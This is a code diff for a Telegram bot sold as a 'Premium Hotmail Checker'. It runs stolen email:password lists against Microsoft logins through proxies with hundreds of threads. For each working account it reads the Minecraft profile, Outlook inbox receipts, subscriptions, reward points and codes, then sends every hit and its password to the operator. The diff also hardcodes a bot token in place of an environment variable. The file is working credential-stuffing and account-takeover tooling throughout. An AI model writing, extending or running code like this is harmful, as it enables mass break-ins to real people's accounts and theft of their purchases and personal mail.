@@ -16,18 +16,13 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 
 # Config
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_ID = int(os.getenv("ADMIN_ID", "5944410248"))
-
-if not BOT_TOKEN:
-    # Set this in your environment variables for production
-    raise ValueError("BOT_TOKEN not found in environment!")
+BOT_TOKEN = "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak"
+ADMIN_ID = 5944410248
 DB = "checker.db"
 
 # Global proxy list and thread pool
 PROXIES = []
 db_lock = threading.Lock()
-# Custom executor for high CPM (supporting up to 250 threads)
 executor = ThreadPoolExecutor(max_workers=300)
 
 class Database:
@@ -178,7 +173,7 @@ class Checker:
         self.session = requests.Session()
         self.session.verify = False
         if proxy:
-            self.session.proxies = {'http': proxy, 'https': proxy}
+            self.session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
 
         self.sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
         self.headers = {
@@ -266,13 +261,11 @@ class Checker:
     def capture_full(self, token, email):
         cap = {'minecraft': 'No', 'psn': 'No', 'steam': 'No', 'supercell': 'No', 'tiktok': 'No', 'subs': []}
         try:
-            # Minecraft
             try:
                 r = self.session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, timeout=10)
                 if r.status_code == 200: cap['minecraft'] = f"Yes ({r.json().get('name')})"
             except: pass
             
-            # Inbox Checks
             cid = self.session.cookies.get("MSPCID", "").upper()
             headers = {'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0'}
             queries = {'psn': "sony@txn-email.playstation.com OR PlayStation Order", 'steam': "noreply@steampowered.com purchase", 'supercell': "noreply@id.supercell.com", 'tiktok': "account.tiktok"}
@@ -285,7 +278,6 @@ class Checker:
                         if t > 0: cap[key] = f"Yes ({t})"
                     except: pass
 
-            # Subscriptions
             state = json.dumps({"userId": str(uuid.uuid4()).replace('-', '')[:16], "scopeSet": "pidl"})
             url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state) + "&prompt=none"
             r = self.session.get(url, headers={"Referer": "https://account.microsoft.com/"}, timeout=15)
@@ -324,8 +316,8 @@ async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
     db.add_user(uid, u.effective_user.username, u.effective_user.first_name)
     if db.is_banned(uid): return
 
-    t = f"🚀 **Hotmail Checker v2**\n\nCPM is optimized using flux flow.\nProxies: `{len(PROXIES)}` loaded."
-    kb = [[InlineKeyboardButton("🔍 Check", callback_data="check"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
+    t = f"🚀 **Premium Hotmail Checker**\n\nOptimized Flux Flow enabled.\nProxies: `{len(PROXIES)}` loaded."
+    kb = [[InlineKeyboardButton("🔍 Start Check", callback_data="check"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
           [InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("🌐 Proxies", callback_data="proxies")]]
     if uid == ADMIN_ID: kb.append([InlineKeyboardButton("🛠 Admin", callback_data="admin")])
 
@@ -338,8 +330,9 @@ async def handle_proxies(u: Update, c: ContextTypes.DEFAULT_TYPE):
         f = await c.bot.get_file(u.message.document.file_id)
         content = (await f.download_as_bytearray()).decode('utf-8')
         global PROXIES
-        PROXIES = [l.strip() for l in content.split('\n') if l.strip()]
-        await u.message.reply_text(f"✅ Loaded `{len(PROXIES)}` proxies.")
+        # Supports ip:port format
+        PROXIES = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
+        await u.message.reply_text(f"✅ Loaded `{len(PROXIES)}` proxies (HTTP/HTTPS supported).")
 
 async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
     uid = u.effective_user.id
@@ -352,14 +345,16 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
     settings = db.get_user_settings(uid)
     max_threads = min(settings['threads'] if PROXIES else 5, 250)
 
-    status_msg = await u.message.reply_text("🔄 **Starting check...**", parse_mode='Markdown')
+    status_msg = await u.message.reply_text("🔄 **Initializing...**", parse_mode='Markdown')
     hits, bad, tfa, checked = 0, 0, 0, 0
     start_time = time.time()
     results_file = f"hits_{uid}.txt"
     update_lock = asyncio.Lock()
+    last_hits = []
+    last_update = 0
 
     async def worker(line):
-        nonlocal hits, bad, tfa, checked
+        nonlocal hits, bad, tfa, checked, last_update
         try:
             e, p = line.split(':', 1)
             e, p = e.strip(), p.strip()
@@ -372,21 +367,33 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
             if res['status'] == 'hit':
                 hits += 1
                 cap = res['cap']
-                cap_str = ", ".join([f"{k}: {v}" for k,v in cap.items() if v != 'No' and k != 'subs'])
-                if cap.get('subs'): cap_str += f" | Subs: {', '.join(cap['subs'])}"
-                ht = f"🎯 **HIT**\n📧 `{e}`\n🔑 `{p}`\n💰 Points: `{res['points']}`\n🎁 Codes: `{len(res['codes'])}`"
-                if cap_str: ht += f"\n🎮 Capture: `{cap_str}`"
-                if res['keywords']: ht += f"\n📂 Keywords: `{', '.join(res['keywords'])}`"
+                cap_str = ", ".join([f"{k}:{v}" for k,v in cap.items() if v != 'No' and k != 'subs'])
+                if cap.get('subs'): cap_str += f" | Subs:{', '.join(cap['subs'])}"
+
+                ht = f"🎯 **HIT**\n📧 `{e}`\n🔑 `{p}`\n💰 Pts: `{res['points']}`\n🎁 Codes: `{len(res['codes'])}`"
+                if cap_str: ht += f"\n🎮 Cap: `{cap_str}`"
+                if res['keywords']: ht += f"\n📂 Key: `{', '.join(res['keywords'])}`"
+
+                last_hits.append(f"✅ {e}")
+                if len(last_hits) > 5: last_hits.pop(0)
+
                 await c.bot.send_message(uid, ht, parse_mode='Markdown')
-                with open(results_file, 'a') as f: f.write(f"{e}:{p} | Points: {res['points']} | Capture: {cap_str} | Keywords: {res['keywords']} | Codes: {res['codes']}\n")
+                with open(results_file, 'a') as f: f.write(f"{e}:{p} | Pts: {res['points']} | Cap: {cap_str} | Key: {res['keywords']} | Codes: {res['codes']}\n")
             elif res['status'] == '2fa': tfa += 1
             else: bad += 1
 
             async with update_lock:
-                if checked % 5 == 0 or checked == len(lines):
-                    elapsed = time.time() - start_time
+                now = time.time()
+                if now - last_update > 2 or checked == len(lines):
+                    last_update = now
+                    elapsed = now - start_time
                     cpm = int((checked / elapsed) * 60) if elapsed > 0 else 0
-                    prg = f"🔄 **Checking...**\n\n📈 Progress: `{checked}/{len(lines)}`\n🎯 Hits: `{hits}`\n💀 Bad: `{bad}`\n🔒 2FA: `{tfa}`\n⚡️ CPM: `{cpm}`"
+                    capture_screen = "\n".join(last_hits)
+                    prg = (f"🔄 **Live Capture Screen**\n\n"
+                           f"📊 Progress: `{checked}/{len(lines)}`\n"
+                           f"🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n"
+                           f"🔒 2FA: `{tfa}` | ⚡️ CPM: `{cpm}`\n\n"
+                           f"🕒 Last Hits:\n`{capture_screen or 'None yet'}`")
                     try: await status_msg.edit_text(prg, parse_mode='Markdown')
                     except: pass
         except: pass
@@ -398,9 +405,9 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
     await asyncio.gather(*(sem_worker(l) for l in lines))
 
     if os.path.exists(results_file):
-        with open(results_file, 'rb') as f: await u.message.reply_document(f, caption=f"✅ **Check Finished!**\nHits: `{hits}`", parse_mode='Markdown')
+        with open(results_file, 'rb') as f: await u.message.reply_document(f, caption=f"✅ **Check Complete!** Hits: `{hits}`", parse_mode='Markdown')
         os.remove(results_file)
-    else: await u.message.reply_text("✅ **Check Finished!** No hits.", parse_mode='Markdown')
+    else: await u.message.reply_text("✅ **Check Complete!** No hits.", parse_mode='Markdown')
 
 async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
     q = u.callback_query
@@ -408,26 +415,26 @@ async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
     await q.answer()
     if q.data == "settings":
         s = db.get_user_settings(uid)
-        await q.edit_message_text(f"⚙️ **Settings**\n\nThreads: `{s['threads']}`\nKeywords: `{', '.join(s['keywords']) or 'None'}`\n\nUse `/threads 1-250` and `/keywords word1,word2`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
-    elif q.data == "check": await q.edit_message_text("📝 **Send your combo** (email:password) or upload a `.txt` file.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
+        await q.edit_message_text(f"⚙️ **Settings**\n\nThreads: `{s['threads']}`\nKeywords: `{', '.join(s['keywords']) or 'None'}`\n\nCommands: `/threads 1-250`, `/keywords word1,word2`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
+    elif q.data == "check": await q.edit_message_text("📝 **Combo Input**\n\nSend `email:password` list or upload a `.txt` file.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
     elif q.data == "stats":
         s = db.user_stats(uid)
-        await q.edit_message_text(f"📊 **Stats for {u.effective_user.first_name}**\n\n💰 Credits: `{'Unlimited' if uid == ADMIN_ID else s['credits']}`\n🔍 Checks: `{s['checks']}`\n🎯 Hits: `{s['hits']}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
-    elif q.data == "proxies": await q.edit_message_text(f"🌐 **Proxies**\n\nLoaded: `{len(PROXIES)}`.\nUpdate by uploading .txt with 'proxy' in caption.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
+        await q.edit_message_text(f"📊 **Statistics for {u.effective_user.first_name}**\n\n💰 Credits: `{'Unlimited' if uid == ADMIN_ID else s['credits']}`\n🔍 Checks: `{s['checks']}`\n🎯 Hits: `{s['hits']}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
+    elif q.data == "proxies": await q.edit_message_text(f"🌐 **Proxy Loader**\n\nLoaded: `{len(PROXIES)}` proxies.\nFormat: `ip:port` (HTTP/HTTPS only).\nUpdate by uploading .txt with 'proxy' in caption.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
     elif q.data == "admin":
         if uid == ADMIN_ID:
             s = db.get_stats()
-            await q.edit_message_text(f"🛠 **Admin**\n\nUsers: `{s['total']}`\nActive: `{s['active']}`\nChecks: `{s['checks']}`\nHits: `{s['hits']}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
+            await q.edit_message_text(f"🛠 **Admin Panel**\n\nUsers: `{s['total']}`\nActive: `{s['active']}`\nChecks: `{s['checks']}`\nHits: `{s['hits']}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
     elif q.data == "back": await start(u, c)
 
 async def set_threads(u: Update, c: ContextTypes.DEFAULT_TYPE):
     try:
         t = int(c.args[0])
-        if 1 <= t <= 250: db.update_settings(u.effective_user.id, threads=t); await u.message.reply_text(f"✅ Threads set to `{t}`.")
+        if 1 <= t <= 250: db.update_settings(u.effective_user.id, threads=t); await u.message.reply_text(f"✅ Threads: `{t}`")
     except: pass
 
 async def set_keywords(u: Update, c: ContextTypes.DEFAULT_TYPE):
-    if c.args: kws = [k.strip() for k in ' '.join(c.args).split(',') if k.strip()]; db.update_settings(u.effective_user.id, keywords=kws); await u.message.reply_text(f"✅ Keywords: `{', '.join(kws)}`.")
+    if c.args: kws = [k.strip() for k in ' '.join(c.args).split(',') if k.strip()]; db.update_settings(u.effective_user.id, keywords=kws); await u.message.reply_text(f"✅ Keywords: `{', '.join(kws)}`")
 
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
